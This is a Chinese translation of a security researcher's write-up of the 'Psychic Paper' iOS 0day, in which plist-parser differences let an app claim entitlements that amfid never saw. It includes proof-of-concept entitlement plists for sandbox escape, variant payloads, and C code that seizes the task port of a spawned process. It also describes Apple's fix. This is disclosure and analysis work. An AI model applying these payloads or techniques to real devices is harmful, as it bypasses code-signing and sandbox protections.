> 原文链接: https://www.anquanke.com//post/id/204395 


# Psychic Paper——iOS应用提权0day


                                阅读量   
                                **384998**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者siguza，文章来源：siguza.github.io
                                <br>原文地址：[https://siguza.github.io/psychicpaper/](https://siguza.github.io/psychicpaper/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t0113da717bc09ea9e8.jpg)](https://p4.ssl.qhimg.com/t0113da717bc09ea9e8.jpg)



## 0. 概述

近日苹果发布了iOS 13.5 beta 3, 本次更新修复了我发现的一个Bug。它不仅仅是一个简单的Bug, 更是迄今我发现的第一个0day, 与此同时可能也是迄今最好的0day之一。或许这个0day不在于让你有所收获, 而是在于这个0day无比简单, 简单到我在[Twitter发布的PoC](https://twitter.com/s1guza/status/1255641164885131268)看起来简直是个玩笑, 但这是100%真实的。

我将其命名为「通灵纸片」, 一如神秘博士随身携带的同名物件, 通过这个漏洞你可以使得他人相信你拥有本未拥有的凭据, 从而通过安全检查。

和我进行的其他Bug或exploit对比, 在不掌握任何关于iOS和exploit背景知识情况下也能够理解本次0day。本着这种精神, 我将尝试以不具备iOS和exploit知识的方式撰写本文。希望你能大致了解XML, 公钥加密和哈希。熟悉C代码将帮助你更好的理解本文。



## 1. 背景

### <a class="reference-link" name="1.1%20%E6%8A%80%E6%9C%AF%E8%83%8C%E6%99%AF"></a>1.1 技术背景

首先让我们一起来看一段XML文件示例:

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE figment-of-my-imagination&gt;
&lt;container&gt;
    &lt;meow&gt;value&lt;/meow&gt;
    &lt;whatever/&gt;
&lt;/container&gt;
&lt;!-- herp --&gt;
&lt;idk a="b" c="d"&gt;xyz&lt;/idk&gt;
```

基本概念标签(Tag), `&lt;tag&gt;`打开标签, `&lt;/tag&gt;`关闭标签。在标签起始和结束标记之间插入内容, 内容可以是原始文本或更多标签。空标签可以是形如`&lt;tag/&gt;`的自关闭标签, 可以具有`key="val"`等属性。

上面的XML文件额外展示了除基本标签之外的三种语法:
<li>
`&lt;?...?&gt;`, 以问号开头和结尾的标签称为处理指令, 会特殊处理。</li>
<li>
`&lt;!DOCTYPE...&gt;`, 以`!DOCTYPE`开头的标签称为文档类型声明, 同样会特殊处理。</li>
<li>
`&lt;!-- --&gt;`, 以`&lt;!--`开头, 并以`--&gt;`结尾的标签为注释, 该标签和标签的内容会被忽略。</li>
完整的[XML规范](https://www.w3.org/TR/xml/)包含了很多其他额外内容, 但这些内容与本文无关。

XML解析令人生畏, 你可以构造`&lt;mis&gt;matched&lt;/tags&gt;`这样的不匹配标签, 形如`&lt;attributes that="never closed"&gt;`甚至`&lt;tags are never closed&gt;`的未关闭标签, 或者一个`&lt;!&gt;`标签, 不胜枚举。因此正确解析XML格式绝非易事, 这一点对于我们本次讨论的Bug至关重要。

基于XML, 有一种名为`"property list"`(简称`plist`)的格式用于保存序列化数据。plist格式支持数组、字典、字符串、数字等等。plist文件存在多种形式, 在Apple软件生态常见的仅有两种, 分别是与本文无关的二进制格式`bplist`和基于XML的格式。一个有效的XML/plist文件如下:

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;OS Build Version&lt;/key&gt;
    &lt;string&gt;19D76&lt;/string&gt;
    &lt;key&gt;IOConsoleLocked&lt;/key&gt;
    &lt;false/&gt;
    &lt;!-- abc --&gt;
    &lt;key&gt;IOConsoleUsers&lt;/key&gt;
    &lt;array&gt;
        &lt;dict&gt;
            &lt;key&gt;kCGSSessionUserIDKey&lt;/key&gt;
            &lt;integer&gt;501&lt;/integer&gt;
            &lt;key&gt;kCGSessionLongUserNameKey&lt;/key&gt;
            &lt;string&gt;Siguza&lt;/string&gt;
        &lt;/dict&gt;
    &lt;/array&gt;
    &lt;!-- def --&gt;
    &lt;key&gt;IORegistryPlanes&lt;/key&gt;
    &lt;dict&gt;
        &lt;key&gt;IODeviceTree&lt;/key&gt;
        &lt;string&gt;IODeviceTree&lt;/string&gt;
        &lt;key&gt;IOService&lt;/key&gt;
        &lt;string&gt;IOService&lt;/string&gt;
    &lt;/dict&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

Plist文件在iOS和macOS系统中俯拾皆是, 常用于配置文件、包属性声明, 以及对于本文最重要的代码签名。

一个二进制文件要在iOS上运行, 名为`AppleMobileFileIntegrity`(简称`AMFI`)的内核插件会要求该文件拥有有效的代码签名, 否则会被杀死进程。代码签名的具体机制我们无需关心, 对我们而言只需要知道它由一个哈希标识, 可以通过以下两种方式验证:
1. 系统预置的签名, 称为`ad-hoc`签名。用于iOS系统应用和守护程序, 只需要在内核中对照已知哈希的集合检查即可。
1. 使用代码签名证书的代码签名, 用于所有第3方应用程序。在这种情况下AMFI调用运行在用户空间的守护程序`amfid`进行校验。
代码签名证书有两种形式:
1. App Store证书, 该证书仅由苹果自身所有。想要这种方式签名需要通过应用商店审核。
1. 开发者证书, 可以是免费的7天有效期证书, 常规开发者证书, 或是企业发布证书。
对于后者, 请求签名的应用需要一个由Xcode获取的配置文件, 将该文件放置在应用安装包 embedded.mobileprovision 文件内。并由Apple并指定签名有效时间, 设备列表, 有效的开发者帐户, 以及应适用于该应用程序的所有限制。

现在简要介绍一下应用沙箱和安全边界。

在标准Unix环境中几乎唯有UID检查这一安全边界, 一个UID的进程无法访问另一UID的资源, 并且任何被视为”特权”的资源都需要UID 0, 即root用户。iOS和macOS沿用了这一机制, 同时也引入了`entitlements`(权利)这一概念, 通俗的说, entitlements是应用于二进制文件的属性和特权列表。如果存在, 他们将以XML/plist的形式嵌入到二进制文件的代码签名中, 如下所示:

```
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;task_for_pid-allow&lt;/key&gt;
    &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

这意味着所述可执行文件拥有”task_for_pid-allow”的entitlements, 即允许调用task_for_pid()这一常规iOS应用无权使用的mach接口。对于entitlements的检查在iOS和macOS系统中贯穿始终, 诸如此类的entitlements数量逾千种(如果你好奇的话, Jonathan Levin创建了已知entitlements目录)。

重点在于, 所有第三方iOS应用都置于沙盒容器中。在沙盒中应用被限制访问尽可能少的文件、服务和内核API, 但与此同时配置entitlements可以突破这些限制。

于是一个有趣的问题摆在我们面前。iOS系统预置应用和守护进程由Apple进行签名, 它们不会索取应用不必要的特权。第三方应用程序经开发者申请后同样由Apple签署, 但申请签名提交的配置文件由开发人员自行创建, Apple仅负责签名。

这意味着配置文件只能创建被允许的entitlements列表, 否则将触发iOS系统安全限制。通过文本方式打开申请签名时提交的配置文件会观察到类似如下的内容:

```
&lt;key&gt;Entitlements&lt;/key&gt;
&lt;dict&gt;
    &lt;key&gt;keychain-access-groups&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;YOUR_TEAM_ID.*&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;get-task-allow&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;application-identifier&lt;/key&gt;
    &lt;string&gt;YOUR_TEAM_ID.com.example.app&lt;/string&gt;
    &lt;key&gt;com.apple.developer.team-identifier&lt;/key&gt;
    &lt;string&gt;YOUR_TEAM_ID&lt;/string&gt;
&lt;/dict&gt;
```

与现有的1000多种授权相比, 此列表非常短, 仅有两个功能性授权`keychain-access-groups`（与凭据相关）和`get-task-allow`（允许调试应用）。

### <a class="reference-link" name="1.2%20%E5%8E%86%E5%8F%B2%E8%83%8C%E6%99%AF"></a>1.2 历史背景

早在2016年秋天, 我基于臭名昭著的`Pegasus vulnerabilities`(飞马漏洞)撰写了自己的首个内核exploit。Pegasus vulnerabilities利用了XNU内核中`OSUnserializeBinary`函数的内存错误, 该函数为另一个名为`OSUnserializeXML`函数的调用, 这两个函数不是用来解析XML数据, 而是内核用于解析plist的方式。

鉴于我刚刚发现的内核exploit以及这两个代码混乱的函数, 在2017年1月我开始仔细研究它们以期挖掘更多内存Bug。

与此同时我正在探究如何在没有Xcode的情况下构建iOS应用。一方面是因为我想了解底层原理, 另一方面是因为我讨厌使用图形界面进行开发, 尤其是当Google搜索结果遍地的“单击此处”随着Xcode界面更新操作入口移至别处而不再有效。因此我每隔7天就会通过Xcode获取一个配置文件, 使用`xcrun -sdk iphoneos clang`手动构建应用程序的二进制文件, 运用`codesign`对其进行签名, 然后通过`libimobiledevice`的`ideviceinstaller`进行安装。

正是这一系列组合操作以及走大运使我发现Bug并兴奋地发了推文。



## 2. 漏洞详情

按照常理, 检查某个进程是否拥有某项权利的代码会以一个进程句柄和一个权利名称作为输入, 并返回一个表明该进程是否具有该权利的布尔值。庆幸的是, XNU在`iokit/bsddev/IOKitBSDInit.cpp`中恰好实现了这样的函数:

```
extern "C" boolean_t
IOTaskHasEntitlement(task_t task, const char * entitlement)
`{`
    OSObject * obj;
    obj = IOUserClient::copyClientEntitlement(task, entitlement);
    if (!obj) `{`
        return false;
    `}`
    obj-&gt;release();
    return obj != kOSBooleanFalse;
`}`
```

大部分工作由`iokit/Kernel/IOUserClient`中的这两个函数完成:

```
OSDictionary* IOUserClient::copyClientEntitlements(task_t task)
`{`
#define MAX_ENTITLEMENTS_LEN    (128 * 1024)

    proc_t p = NULL;
    pid_t pid = 0;
    size_t len = 0;
    void *entitlements_blob = NULL;
    char *entitlements_data = NULL;
    OSObject *entitlements_obj = NULL;
    OSDictionary *entitlements = NULL;
    OSString *errorString = NULL;

    p = (proc_t)get_bsdtask_info(task);
    if (p == NULL) `{`
        goto fail;
    `}`
    pid = proc_pid(p);

    if (cs_entitlements_dictionary_copy(p, (void **)&amp;entitlements) == 0) `{`
        if (entitlements) `{`
            return entitlements;
        `}`
    `}`

    if (cs_entitlements_blob_get(p, &amp;entitlements_blob, &amp;len) != 0) `{`
        goto fail;
    `}`

    if (len &lt;= offsetof(CS_GenericBlob, data)) `{`
        goto fail;
    `}`


    /*
     * Per &lt;rdar://problem/11593877&gt;, enforce a limit on the amount of XML
     * we'll try to parse in the kernel.
     */
    len -= offsetof(CS_GenericBlob, data);
    if (len &gt; MAX_ENTITLEMENTS_LEN) `{`
        IOLog("failed to parse entitlements for %s[%u]: %lu bytes of entitlements exceeds maximum of %un",
            proc_best_name(p), pid, len, MAX_ENTITLEMENTS_LEN);
        goto fail;
    `}`

    /*
     * OSUnserializeXML() expects a nul-terminated string, but that isn't
     * what is stored in the entitlements blob.  Copy the string and
     * terminate it.
     */
    entitlements_data = (char *)IOMalloc(len + 1);
    if (entitlements_data == NULL) `{`
        goto fail;
    `}`
    memcpy(entitlements_data, ((CS_GenericBlob *)entitlements_blob)-&gt;data, len);
    entitlements_data[len] = '';

    entitlements_obj = OSUnserializeXML(entitlements_data, len + 1, &amp;errorString);
    if (errorString != NULL) `{`
        IOLog("failed to parse entitlements for %s[%u]: %sn",
            proc_best_name(p), pid, errorString-&gt;getCStringNoCopy());
        goto fail;
    `}`
    if (entitlements_obj == NULL) `{`
        goto fail;
    `}`

    entitlements = OSDynamicCast(OSDictionary, entitlements_obj);
    if (entitlements == NULL) `{`
        goto fail;
    `}`
    entitlements_obj = NULL;

fail:
    if (entitlements_data != NULL) `{`
        IOFree(entitlements_data, len + 1);
    `}`
    if (entitlements_obj != NULL) `{`
        entitlements_obj-&gt;release();
    `}`
    if (errorString != NULL) `{`
        errorString-&gt;release();
    `}`
    return entitlements;
`}`

OSObject* IOUserClient::copyClientEntitlement(task_t task, const char * entitlement )
`{`
    OSDictionary *entitlements;
    OSObject *value;

    entitlements = copyClientEntitlements(task);
    if (entitlements == NULL) `{`
        return NULL;
    `}`

    /* Fetch the entitlement value from the dictionary. */
    value = entitlements-&gt;getObject(entitlement);
    if (value != NULL) `{`
        value-&gt;retain();
    `}`

    entitlements-&gt;release();
    return value;
`}`

```

太棒了, 现在我们掌握了一个基于OSUnserializeXML的用于entitlements检查的参考实现。确实如此吗?

关于这个缺陷有一个很无厘头的事情, 我没办法指着特定的代码告诉你是这里导致的Bug。之所以如此, 是因为iOS实现了不止一个plist解析器, 甚至不止两个, 三个。iOS实现了至少4个plist解析器, 分别是:
<li>
`OSUnserializeXML` 位于 kernel</li>
<li>
`IOCFUnserialize` 位于 IOKitUser</li>
<li>
`CFPropertyListCreateWithData` 位于 CoreFoundation</li>
<li>
`xpc_create_from_plist` 位于 libxpc (闭源)</li>
由此引起了三个有趣的问题:
1. 哪个解析器用于解析entitlements?
1. 哪个解析器被amfid采用?
1. 所有解析器的解析结果都相同吗?
三者的答案分别是
1. 全都用到了
1. CFPropertyListCreateWithData
1. 并不
由于正确解析XML异常困难, 因此对于有效的XML所有解析器返回相同的数据, 而稍微无效的XML它们会返回略有不同的数据。

换言之, 可以利用解析器的不同来使不同的解析器看到不同的内容。这是该Bug的核心, 使它不局限于逻辑缺陷, 更成为系统设计缺陷。

在继续exploit之前我想指出, 在所有测试中OSUnserializeXML和IOCFUnserialize始终返回相同的数据, 因此在本文的其余部分中我将它们视为等效。为简便起见, 我将 OSUnserializeXML/IOCFUnserialize简称为“IOKit”, CFPropertyListCreateWithData简称为“CF”和xpc_create_from_plist简称为“XPC”。



## 3. 漏洞利用

让我们从我发推的PoC变体开始, 这可能是利用此Bug的最优雅的方式：

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;!-- these aren't the droids you're looking for --&gt;
    &lt;!---&gt;&lt;!--&gt;
    &lt;key&gt;platform-application&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;com.apple.private.security.no-container&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;task_for_pid-allow&lt;/key&gt;
    &lt;true/&gt;
    &lt;!-- --&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

有趣的标签`&lt;!---&gt;`和`&lt;!--`, 按照我对XML规范的理解它们不是有效的XML标签, 然而IOKit, CF和XPC都接受上述XML/plist, 尽管解析结果不尽相同。

我写了一个名为plparse的小工具, 通过输入文件和-c, -i, -x来分别使用CF, IOKit, XPC解析器来解析XML文件。使用上面的文件运行plparse我们得到如下结果:

```
% plparse -cix ent.plist 
`{`
`}`
`{`
    task_for_pid-allow: true,
    platform-application: true,
    com.apple.private.security.no-container: true,
`}`
`{`
    com.apple.private.security.no-container: true,
    platform-application: true,
    task_for_pid-allow: true,
`}`
```

输出格式类似于JSON的简化版不影响了解它的要旨。从上到下依次是CF, IOKit 和 XPC的输出结果。这意味着当我们将上述entitlements文件传递到我们的应用程序（加上我们需要的App ID等）, amfid使用CF来检查我们是否越权访问配置文件之外的entitlements时查看不到结果。但是当内核或某些守护进程想要检查是否允许我们执行Fun Stuff™时会看到我们拥有所有权限！那么这个示例如何生效? 这是CF的注释标签处理代码（存在多处）:

```
case '!':
    // Could be a comment
    if (pInfo-&gt;curr+2 &gt;= pInfo-&gt;end) `{`
        pInfo-&gt;error = __CFPropertyListCreateError(kCFPropertyListReadCorruptError, CFSTR("Encountered unexpected EOF"));
        return false;
    `}`
    if (*(pInfo-&gt;curr+1) == '-' &amp;&amp; *(pInfo-&gt;curr+2) == '-') `{`
        pInfo-&gt;curr += 2;
        skipXMLComment(pInfo);
    `}` else `{`
        pInfo-&gt;error = __CFPropertyListCreateError(kCFPropertyListReadCorruptError, CFSTR("Encountered unexpected EOF"));
        return false;
    `}`
    break;

// ...
static void skipXMLComment(_CFXMLPlistParseInfo *pInfo) `{`
    const char *p = pInfo-&gt;curr;
    const char *end = pInfo-&gt;end - 3; // Need at least 3 characters to compare against
    while (p &lt; end) `{`
        if (*p == '-' &amp;&amp; *(p+1) == '-' &amp;&amp; *(p+2) == '&gt;') `{`
            pInfo-&gt;curr = p+3;
            return;
        `}`
        p ++; 
    `}`
    pInfo-&gt;error = __CFPropertyListCreateError(kCFPropertyListReadCorruptError, CFSTR("Unterminated comment started on line %d"), lineNumber(pInfo));
`}`
```

这是IOKit的注释标签处理代码：

```
if (c == '!') `{`
    c = nextChar();
    bool isComment = (c == '-') &amp;&amp; ((c = nextChar()) != 0) &amp;&amp; (c == '-');
    if (!isComment &amp;&amp; !isAlpha(c)) `{`
        return TAG_BAD;                      // &lt;!1, &lt;!-A, &lt;!eos
    `}`
    while (c &amp;&amp; (c = nextChar()) != 0) `{`
        if (c == 'n') `{`
            state-&gt;lineNumber++;
        `}`
        if (isComment) `{`
            if (c != '-') `{`
                continue;
            `}`
            c = nextChar();
            if (c != '-') `{`
                continue;
            `}`
            c = nextChar();
        `}`
        if (c == '&gt;') `{`
            (void)nextChar();
            return TAG_IGNORE;
        `}`
        if (isComment) `{`
            break;
        `}`
    `}`
    return TAG_BAD;
`}`
```

可以看出, IOKit将检查`!--`字符, 正确地将指针前进三个字符, 然后再看到`-&gt;`, 这不会结束注释。反之, CF仅将指针前移两个字符, 因此它将第二个字符解析两次, 从而同时看到`&lt;!--`和`--&gt;`。这意味着IOKit将`&lt;!---&gt;`视为注释的开始, 而CF则将其视为开始和结束。之后, 我们为两个解析器提供`&lt;!--&gt;`标签, 该标签过于简短以至于无法被两个解析器解析为完整注释。但是在注释中与未在注释中会引起有趣的行为, 如果我们当前在注释中, 则两个解析器都会看到`--&gt;`结束注释, 否则它们都只会看到`&lt;!--`开始标签。总而言之, 这意味着：

```
&lt;!---&gt;
CF sees these bits
&lt;!--&gt;
IOKit sees these bits
&lt;!-- --&gt;
```

至此我们无需继续关注XPC, 后续测试中XPC与IOKit解析结果完全相同, 对我们而言算是好消息一桩。可以使用CF偷偷获得超过amfid的权利, 与此同时IOKit和XPC解析时显示它们！我测试了另外两个变体, 结果不尽相同：

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict hurr="&gt;
&lt;/dict&gt;
&lt;/plist&gt;
"&gt;
    &lt;key&gt;task_for_pid-allow&lt;/key&gt;
    &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;???&gt;&lt;!-- ?&gt;
    &lt;key&gt;task_for_pid-allow&lt;/key&gt;
    &lt;true/&gt;
    &lt;!-- --&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE [%&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;task_for_pid-allow&lt;/key&gt;
    &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
;]&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

与第一种变体相比它们都没有那么优雅, 也没有什么收获, 我将其作为练习让读者了解解析器差异是由哪些原因引起的, 或者不同的解析器如何应对这些文件。

不过要注意的一件事是, 根据在苹果设备上安装IPA文件所使用的方式不同, 获取这些entitlements来存活进程可能遇到问题。<br>
这是因为预置应用程序上的entitlements还包含team ID和app ID, 每次签名时Cydia Impactor都会随机生成该标识符, 因此必须解析, 修改和重新生成entitlements文件。这个问题目前我尚未找到解决方式, 但我获悉Xcode可以正常处理entitlements文件, 同理codesign + ideviceinstaller的手动替代方案也可以正常处理。



## 4. 沙盒逃逸

现在我们只需要挑选所需的entitlements即可, 作为初步PoC我选择以下三项entitlements:
- com.apple.private.security.no-container – 可以阻止沙箱将任何配置文件应用于我们的进程, 这意味着我们现在可以读取和写入`mobile`用户可以访问的任何位置, 执行大量的系统调用, 并与我们之前不允许使用的数百种驱动程序和用户态服务进行对话。就用户数据而言, 安全性不再存在。
- task_for_pid-allow – 万一文件系统不够用, 这使我们可以查找任何以`mobile`运行的进程的任务端口, 然后将其用于读写进程内存或直接获取/设置线程寄存器状态。
- platform-application – 通常, 我们将被标记为非Apple二进制文件, 并且不允许在Apple二进制文件的任务端口上执行上述操作, 但是此entitlements将我们标记为货真价实的系统应用。:P
如果上述entitlements还不够, 假设我们需要CF也拥有某些entitlements, 那么我们可以通过上述三个entitlements轻易的实现。我们要做的就是找到一个包含所需entitlements的二进制文件, `posix_spawn`处于刮起状态, 获取创建新进程的任务端口然后将其招安。

```
task_t haxx(const char *path_of_executable)
`{`
    task_t task;
    pid_t pid;
    posix_spawnattr_t att;
    posix_spawnattr_init(&amp;att);
    posix_spawnattr_setflags(&amp;att, POSIX_SPAWN_START_SUSPENDED);
    posix_spawn(&amp;pid, path_of_executable, NULL, &amp;att, (const char*[])`{` path_of_executable, NULL `}`, (const char*[])`{` NULL `}`);
    posix_spawnattr_destroy(&amp;att);
    task_for_pid(mach_task_self(), pid, &amp;task);
    return task;
`}`
```

您可以进一步获得一些JIT entitlements来动态加载或生成代码, 可以生成shell或浩如烟海的其他内容。

这个缺陷仅有root和kernel两项entitlements没有提供给我们, 但是对于这两种情况, 我们有不胜其数的其他方式。而且我认为与其折腾用户态的root, 不如直接攻破内核态。

亲爱的读者, 我希望您能对我而言丢掉一个0day是偌大的损失有所感受。那么, 不妨升级到“拥有所有entitlements的手机”作为练习吧。:)



## 5. 补丁文件

考虑到此缺陷难以捉摸的性质, Apple最终如何对其进行修补?显然, 只有一种方法：引入更多的plist解析器！唯一的方法！

在iOS13.4中, 归功于Linus Henze的错误报告, Apple在某种程度上加强了entitlements检查:

```
AppleMobileFileIntegrity

Available for: iPhone 6s and later, iPad Air 2 and later, iPad mini 4 and later, and iPod touch 7th generation

Impact: An application may be able to use arbitrary entitlements

Description: This issue was addressed with improved checks.

CVE-2020-3883: Linus Henze (pinauten.de)
```

虽然我不知道该错误的确切细节, 但根据Linus的一条推文, 我认为这与bplist有关, 尽管利用了解析器差异, 但不会过去。我的错误实际上在13.4修复中仍然存在, 但最终在13.5 beta 3中被杀死。

我也不知道是Linus, Apple还是其他人寻求更多解析器差异, 但是在两个连续的次要iOS版本中修复了两个授权错误, 这感觉太巧合了, 所以我强烈假设从Linus的错误中汲取灵感的人。

苹果公司的最终解决方案包括引入一个称为`AMFIUnserializeXML`的新函数, 该函数既粘贴到`AMFI.kext`中, 又粘贴到`amfid`中, 用于与`OSUnserializeXML`和`CFPropertyListCreateWithData`的结果进行比较以确保它们相同。您仍然可以在权利中包含一个类似`&lt;!---&gt;` `&lt;!-&gt;` `&lt;!--&gt;`的序列, 该序列将会通过, 但是尝试在这些注释之间偷偷摸摸, AMFI将破坏您的流程切碎并报告给syslog： AMFI：在权利解析期间检测到异常。

因此, 尽管从技术上确实使XML/plist解析器的数量从4增加到了6, 但确实缓解了我发现的漏洞。:(



## 6. 结论

随着我的第一个0day被修复, 我无比期望能发现一个更棒的0day。这个Bug已帮助我完成了数十个研究项目, 每年被使用数千次, 为我节省了很多时间。关于这个Bug的exploit很可能是我一生中写的最可靠, 最整洁, 最优雅的代码。甚至可以用一条推文演示！

我们也应该问自己, 这样的错误怎么可能存在。为什么在iOS上有4个不同的plist解析器? 甚至为什么我们还在使用XML? 我认为它们比技术细节更值得思考。

回顾全文, 尽管定期自问我们的思维模式是否有错或者更详尽的记录与探讨是好办法。但我们也不应对Apple过分苛责, 或许这类Bug最难发现, 而且我真的不知道我怎么能找到它, 而很多其他人却找不到。

由于行文仓促难免有所疏漏, 敬请不吝赐教交流。通过我的Twitter或**@**.net电子邮箱和我取得联系, 其中* = siguza。

在撰写本文时, 该Bug仍存在于最新的正式版iOS中。我在[GitHub](https://github.com/Siguza/psychicpaper)托管了完整的项目源码, 趁着漏洞尚未完全封堵尽情把玩吧！
